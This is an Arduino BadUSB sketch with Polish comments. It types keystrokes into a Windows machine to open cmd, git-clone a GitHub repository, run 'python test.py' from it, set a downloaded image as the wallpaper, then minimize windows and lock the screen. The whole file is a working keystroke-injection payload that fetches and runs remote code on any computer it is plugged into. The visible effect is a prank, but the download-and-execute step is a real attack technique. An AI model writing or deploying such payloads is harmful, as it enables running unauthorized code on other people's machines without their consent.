#include <Keyboard.h>





void setup() {
  // put your setup code here, to run once:
Keyboard.begin();
delay(4000);


// otwarcie okna
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('r');
Keyboard.releaseAll();
delay(150);
// otwarcie cmd 
Keyboard.print("cmd.exe");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);
// ustawienie sciezki
Keyboard.print("cd ..");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);
// wejscie
Keyboard.print("cd Public");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);
//klonowanie repo
Keyboard.print("git clone https://github.com/PSZMAJ/BadUSB-ChangeWallpaper.git");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);
// otwarcie repo
Keyboard.print("cd BadUSB-ChangeWallpaper");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(1000);
// otwarcie repo
Keyboard.print("python test.py");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
//delay(3000);
Keyboard.print("start fotka.png");
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(3000);
///// ustawianie
//first tab
Keyboard.press(KEY_TAB);
Keyboard.releaseAll();
delay(500);
// end 
//2 tab
Keyboard.press(KEY_TAB);
Keyboard.releaseAll();
delay(500);
// end 
//3 tab
Keyboard.press(KEY_TAB);
Keyboard.releaseAll();
delay(500);
// end 
//4 tab
Keyboard.press(KEY_TAB);
Keyboard.releaseAll();
delay(500);
// end 
//5 tab
Keyboard.press(KEY_TAB);
Keyboard.releaseAll();
delay(500);
// end 
//6 tab
Keyboard.press(KEY_TAB);
Keyboard.releaseAll();
delay(500);
// end 
//7 tab
Keyboard.press(KEY_TAB);
Keyboard.releaseAll();
delay(500);
// end 
//8 tab
//Keyboard.press(KEY_TAB);
//Keyboard.releaseAll();
//delay(1000);
// end 
//9 tab
//Keyboard.press(KEY_TAB);
//Keyboard.releaseAll();
//delay(1000);
// end 
//10 tab
Keyboard.press(KEY_TAB);
Keyboard.releaseAll();
delay(500);
// end 
//11 tab
Keyboard.press(KEY_TAB);
Keyboard.releaseAll();
delay(500);
// end 
// 1 down
Keyboard.press(KEY_DOWN_ARROW);
Keyboard.releaseAll();
delay(500);
// end 
// 2 down
Keyboard.press(KEY_DOWN_ARROW);
Keyboard.releaseAll();
delay(500);
// end 
// 3 down
Keyboard.press(KEY_DOWN_ARROW);
Keyboard.releaseAll();
delay(150);
// end 
// 4 down
Keyboard.press(KEY_DOWN_ARROW);
Keyboard.releaseAll();
delay(500);
// end 
// 5 down
Keyboard.press(KEY_DOWN_ARROW);
Keyboard.releaseAll();
delay(500);
// end 
// 6 down
Keyboard.press(KEY_DOWN_ARROW);
Keyboard.releaseAll();
delay(500);
// 7 down
Keyboard.press(KEY_DOWN_ARROW);
Keyboard.releaseAll();
delay(500);
// 8 down
Keyboard.press(KEY_DOWN_ARROW);
Keyboard.releaseAll();
delay(500);
// end 
// enter
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(500);
// key down
Keyboard.press(KEY_DOWN_ARROW);
Keyboard.releaseAll();
delay(500);
// enter
Keyboard.press(KEY_RETURN);
Keyboard.releaseAll();
delay(500);
// zamkniecie wszystkich okien
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('m');
Keyboard.releaseAll();
Keyboard.press(KEY_LEFT_GUI);
Keyboard.press('l');
Keyboard.releaseAll();
}

void loop() {
  // put your main code here, to run repeatedly:

}
